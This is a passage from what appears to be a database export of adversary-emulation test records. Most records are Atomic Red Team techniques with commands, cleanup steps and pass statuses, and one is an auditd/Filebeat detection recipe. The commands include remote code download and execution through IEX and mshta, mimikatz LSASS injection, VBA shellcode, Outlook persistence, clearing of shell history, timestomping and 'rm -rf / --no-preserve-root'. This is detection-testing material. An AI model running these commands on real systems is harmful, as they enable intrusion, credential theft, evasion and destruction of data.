$InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/? `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil HelpText method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"$Env:windir\\\\System32\\\\Tasks\\"\\n$InstallerAssemblyFileName = 'readme.txt'\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"readme.txt\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\\nSet-Location \\"$Env:windir\\\\System32\\\\Tasks\\"\\n\\nCopy-Item -Path \\"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\\" -Destination \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = 'Executable'\\n    CommandLine = $CommandLine\\n    InstallUtilPath = \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil evasive invocation", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta vbscript:Execute(\\"CreateObject(\\"\\"Wscript.Shell\\"\\").Run \\"\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\"\\":close\\")\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta executes VBScript to execute malicious command", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["$var =Invoke-WebRequest \\"#{hta_url}\\"\\n$var.content|out-file \\"#{temp_file}\\"\\nmshta \\"#{temp_file}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta Executes Remote HTML Application (HTA)", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "temp_file", "value": "$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta"}, {"key": "hta_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}, {"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Direct download from URI", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "hta_uri", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "rundll32_file_path", "value": "$env:windir\\\\system32\\\\rundll32.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1055\\\\src\\\\x64\\\\T1055-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Execute\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Shellcode execution via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  $wdApp = New-Object -COMObject \\"Word.Application\\"\\n  $path = $wdApp.Path\\n  Stop-Process -Name \\"winword\\"\\n  if ($path.contains(\\"(x86)\\")) { exit 1 } else { exit 0 }\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{psexec_path} /accepteula \\\\\\\\#{machine} -c #{mimikatz_path} \\"lsadump::lsa /inject /id:500\\" \\"exit\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remote Process Injection in LSASS via mimikatz", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{psexec_path}\\") { exit 0} else { exit 1}\\n"], "input_arguments": [{"key": "machine", "value": "DC1"}, {"key": "mimikatz_path", "value": "%tmp%\\\\mimikatz\\\\x64\\\\mimikatz.exe"}, {"key": "psexec_path", "value": "C:\\\\PSTools\\\\PsExec.exe"}], "execution_status": "Pass"}, {"cleanup": "Stop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1055.012\\\\src\\\\T1055.012-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Exploit\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "RunPE via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{exe_binary}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Process Injection via C#", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "exe_binary", "value": "PathToAtomicsFolder\\\\T1055.004\\\\bin\\\\T1055.exe"}], "execution_status": "Pass"}, {"cleanup": "reg delete \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Security\\" /f\\ndel %APPDATA%\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\\n", "command": ["reg add \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Security\\" /t REG_DWORD /d 4\\nif not exist  %APPDATA%\\\\Microsoft\\\\Outlook ( md %APPDATA%\\\\Microsoft\\\\Outlook\\\\ )\\necho \\"Atomic Red Team TEST\\" > %APPDATA%\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Office Application Startup - Outlook as a C2", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "reg.exe delete HKCU\\\\Software\\\\Microsoft\\\\Office\\\\#{outlook_version}\\\\Outlook\\\\WebView\\\\#{outlook_folder} /v URL /f\\n", "command": ["reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Office\\\\#{outlook_version}\\\\Outlook\\\\WebView\\\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Install Outlook Home Page Persistence", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "url", "value": "file://PathToAtomicsFolder\\\\T1137.004\\\\src\\\\T1137.004.html"}, {"key": "outlook_version", "value": 16}, {"key": "outlook_folder", "value": "Inbox"}], "execution_status": "Pass"}]}}}}
252	\N		\N	yes	cmnt added	\N	2021-07-13 05:34:40.774627+00	T1104	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"caldera": [{"cleanup": "clean", "command": ["test cmnd"], "executor": ["pwsh"], "platform": "Linux", "file_name": "", "pre_command": ["test cmnd"], "ability_name": "", "created_date": "13/07/2021", "post_command": ["post test"], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
192	"1. 1st 4 steps from previous rule similar\n2. install auditd service\n3. add following audit rules to keep a watch on which files/ directory\n -w /etc/shadow -p rwa -k shadow_changes\n-w /etc/hosts -p rwa -k hosts_changes\n-w /etc/passwd -p rwa -k passwd_changes etc.\nOR\n-w /etc/ -p a -k etc_changes (audit watch on whole /etc directory just for permission changes)\n4. restart the service\n5. Run chmod <permission> <filename (/etc/passwd or /etc/shadow or /etc/hosts) etc>\n6. check logs in /var/logs/audit/audit.log and filter with keyword to check the operation performed on watch files\n7. check rules in /etc/audit/audit.conf\n8. restart auditd service after every reboot and rules change\n9. restart filebeat post updating logfile path to /var/logs/audit/audit.log\n\n\n"	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1222	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["\\"index : filebeat-*\\nquery : (match_body.message:(*changes* and *chmod*) OR *chattr* OR *chown*)\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.076Z", "pre-requisite": [], "pre-requistes": "\\"1. 1st 4 steps from previous rule similar\\n2. install auditd service\\n3. add following audit rules to keep a watch on which files/ directory\\n -w /etc/shadow -p rwa -k shadow_changes\\n-w /etc/hosts -p rwa -k hosts_changes\\n-w /etc/passwd -p rwa -k passwd_changes etc.\\nOR\\n-w /etc/ -p a -k etc_changes (audit watch on whole /etc directory just for permission changes)\\n4. restart the service\\n5. Run chmod <permission> <filename (/etc/passwd or /etc/shadow or /etc/hosts) etc>\\n6. check logs in /var/logs/audit/audit.log and filter with keyword to check the operation performed on watch files\\n7. check rules in /etc/audit/audit.conf\\n8. restart auditd service after every reboot and rules change\\n9. restart filebeat post updating logfile path to /var/logs/audit/audit.log\\n\\n\\n\\"", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
323	\N		\N	yes	P2	\N	2021-07-30 03:16:54.175797+00	T1574.009	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "fsutil usn createjournal m=1000 a=100 c:\\n", "command": ["fsutil usn deletejournal /D C:\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Indicator Removal using FSUtil", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rm ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (rm)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["echo \\"\\" > ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (echo)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["cat /dev/null > ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (cat dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["ln -sf /dev/null ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (ln dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["truncate -s0 ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (truncate)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["unset HISTFILE\\nexport HISTFILESIZE=0\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear history of a bunch of shells", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "sed -i 's/set +o history//g' ~/.bashrc\\n. ~/.bashrc\\nset -o history\\n", "command": ["set +o history\\necho 'set +o history' >> ~/.bashrc\\n. ~/.bashrc\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear and Disable Bash History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["hostname\\nwhoami\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Use Space Before Command to Avoid Logging to History", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "userdel -f testuser1\\n", "command": ["sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable Bash History Logging with SSH -T", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["/usr/sbin/useradd testuser1\\necho pwd101! | passwd testuser1 --stdin\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Set-PSReadlineOption HistorySaveStyle SaveNothing\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Prevent Powershell History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-Item (Get-PSReadlineOption).HistorySavePath\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Powershell History by Deleting History File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf #{folder_to_delete}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Linux/macOS", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "folder_to_delete", "value": "/tmp/victim-files"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["shred -u #{file_to_shred}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Overwrite and delete a file with shred", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_shred", "value": "/tmp/victim-shred.txt"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["del /f #{file_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{file_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rmdir /s /q #{folder_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{folder_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -path #{file_to_delete}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_to_delete", "value": "$env:TEMP\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path #{folder_to_delete} -Recurse\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "$env:TEMP\\\\deleteme_folder_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf / --no-preserve-root > /dev/null 2> /dev/null\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Delete Filesystem - Linux", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path (Join-Path \\"$Env:SystemRoot\\\\prefetch\\\\\\" (Get-ChildItem -Path \\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\" -Name)[0])\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete Prefetch File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item #{teamviewer_log_file}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete TeamViewer Log Files", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "teamviewer_log_file", "value": "$env:TEMP\\\\TeamViewer_54.log"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -m -t 197001010000.00 #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's modification timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["NOW=$(date)\\ndate -s \\"1970-01-01 00:00:00\\"\\ntouch #{target_filename}\\ndate -s \\"$NOW\\"\\nstat #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's creation timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -acmr #{reference_file_path} #{target_file_path}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Modify file timestamps using reference file", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_file_path", "value": "/opt/filename"}, {"key": "reference_file_path", "value": "/bin/sh"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.CreationTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file creation timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastWriteTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last modified timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastAccessTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last access timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": 